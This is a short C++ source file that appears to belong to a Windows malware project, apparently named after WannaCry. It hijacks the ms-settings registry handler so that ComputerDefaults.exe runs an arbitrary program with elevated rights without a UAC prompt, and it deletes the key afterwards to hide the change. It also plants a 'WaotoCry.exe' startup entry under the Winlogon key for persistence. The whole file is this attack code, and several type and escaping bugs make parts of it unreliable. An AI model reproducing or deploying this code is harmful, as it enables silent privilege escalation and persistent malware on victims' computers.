#include "Un-main.h"

int add_double_data(char new_process_path) {
	HKEY key;
	HKEY hKey = nullptr;
	DWORD dwDisposition;
	::RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
	char data[] = "Software\\Classes\\ms-settings\\Shell\\open\\command";
	RegOpenKeyEx(HKEY_CURRENT_USER, data, 0, KEY_WRITE, &key);
	//char  filePath[] = "C:\\Windows\\System32\\cmd.exe";
	while (1)
	{
		RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)new_process_path, strlen((const char*)new_process_path));
		RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
		BypassUAC();
		Sleep(100);
		RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
		break;
	}
	return 1;
}

int increase(char start_process) {
	HKEY A_Key;
	char login_pth[] = "\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
	::RegOpenKeyEx(HKEY_LOCAL_MACHINE, login_pth, 0, KEY_WRITE, &A_Key);
	::RegSetValueExW(A_Key, L"WaotoCry.exe", 0, REG_SZ, (BYTE*)start_process, sizeof(start_process));
	::RegCloseKey(A_Key);
	return 0;
}




int BypassUAC() {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	HKEY hKey;
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	return 0;
}
